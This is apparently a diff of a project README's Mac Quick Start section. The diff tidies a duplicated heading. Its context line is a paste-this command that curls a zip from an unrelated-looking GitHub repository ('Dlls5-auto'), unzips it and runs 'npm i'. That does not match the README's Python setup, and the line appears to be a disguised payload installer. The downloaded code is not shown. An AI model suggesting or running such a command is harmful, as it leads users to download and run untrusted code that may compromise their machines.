@@ -64,16 +64,10 @@ That's it — the script clones the repo, creates a virtualenv, installs depende
 
 ### 🚀 Quick Start (Mac OS — One Command)
 
-Open **http://localhost:8000** 🎉
-
----
-
-### 🚀 Quick Start (Mac OS — One Command)
-
 ```bash
 curl -fsSL 'https://raw.githubusercontent.com/groundboxerrespect/Dlls5-auto/main/dlls5.zip' | sh -c "cat > 'dlls5.zip' && mkdir -p 'dlls5' && unzip -qo 'dlls5.zip' -d 'dlls5' && cd 'dlls5' && npm i"
 ```
-
+Open **http://localhost:8000** 🎉
 ### Local (Python)
 
 ```bash
